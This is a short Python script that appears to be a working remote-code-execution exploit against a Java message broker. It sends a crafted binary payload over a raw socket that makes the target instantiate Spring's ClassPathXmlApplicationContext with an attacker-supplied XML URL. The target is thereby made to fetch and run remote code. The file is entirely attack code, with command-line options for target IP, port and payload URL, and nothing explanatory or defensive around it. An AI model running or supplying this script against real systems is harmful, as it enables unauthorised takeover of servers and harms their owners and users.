import socket
import sys

def main(ip, port, url):
    payload = f'000000701f000000000000000000010100426f72672e737072696e676672616d65776f726b2e636f6e746578742e737570706f72742e436c61737350617468586d6c4170706c69636174696f6e436f6e7465787401001d{url.encode().hex()}'
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((ip, int(port)))
    conn.send(bytes.fromhex(payload))
    conn.close()

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--ip', help='Target IP')
    parser.add_argument('-p', '--port', help='Target Port')
    parser.add_argument('-u', '--url', help='URL of XML')
    args = parser.parse_args()
    main(args.ip, args.port, args.url)
